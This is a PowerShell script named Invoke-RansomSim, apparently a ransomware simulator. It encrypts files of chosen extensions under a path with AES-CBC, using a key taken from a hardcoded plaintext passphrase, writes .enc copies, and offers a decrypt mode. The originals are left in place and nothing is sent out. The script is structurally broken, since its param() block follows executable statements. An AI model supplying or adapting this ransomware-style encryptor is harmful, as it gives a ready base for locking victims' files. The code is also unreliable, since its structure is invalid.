# Hardcoded passphrase stored as plaintext
$passphrase = 'Orion_1234567890'
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($passphrase) | Select-Object -First 32
$IVBytes  = [System.Text.Encoding]::UTF8.GetBytes($passphrase) | Select-Object -First 16
$KeyBase64 = [Convert]::ToBase64String($KeyBytes)
$IVBase64  = [Convert]::ToBase64String($IVBytes)

# Main execution block - parses args from command line or $args
param(
    [Parameter(Position=0,Mandatory)]
    [string]$Path,
    
    [Parameter(Position=1,Mandatory)]
    [string[]]$Extension,
    
    [switch]$Recurse,
    
    [switch]$Decrypt
)

function Invoke-RansomSim {
    param($Path, $Extension, $Recurse, $Decrypt, $KeyBase64, $IVBase64)
    
    $keyBytes = [Convert]::FromBase64String($KeyBase64)
    $ivBytes  = [Convert]::FromBase64String($IVBase64)
    
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.IV  = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    if ($Decrypt) {
        # Decrypt mode
        $searchParams = @{ Path = $Path; File = $true; Filter = '*.enc' }
        if ($Recurse) { $searchParams.Recurse = $true }
        $files = Get-ChildItem @searchParams
        
        foreach ($file in $files) {
            $inPath = $file.FullName
            $outPath = $inPath -replace '\.enc$',''
            if (Test-Path $outPath) { continue }
            
            $cipherBytes = [System.IO.File]::ReadAllBytes($inPath)
            $decryptor = $aes.CreateDecryptor()
            $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
            [System.IO.File]::WriteAllBytes($outPath, $plainBytes)
            "Decrypted: $inPath -> $outPath"
        }
    } else {
        # Encrypt mode
        $searchParams = @{ Path = $Path; File = $true }
        if ($Recurse) { $searchParams.Recurse = $true }
        $files = Get-ChildItem @searchParams | Where-Object { $Extension -contains $_.Extension }
        
        foreach ($file in $files) {
            $inPath = $file.FullName
            $outPath = "$inPath.enc"
            if (Test-Path $outPath) { continue }
            
            $plainBytes = [System.IO.File]::ReadAllBytes($inPath)
            $encryptor = $aes.CreateEncryptor()
            $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
            [System.IO.File]::WriteAllBytes($outPath, $cipherBytes)
            "Encrypted: $inPath -> $outPath"
        }
    }
}

# Execute with parsed parameters
Invoke-RansomSim -Path $Path -Extension $Extension -Recurse:$Recurse -Decrypt:$Decrypt -KeyBase64 $KeyBase64 -IVBase64 $IVBase64
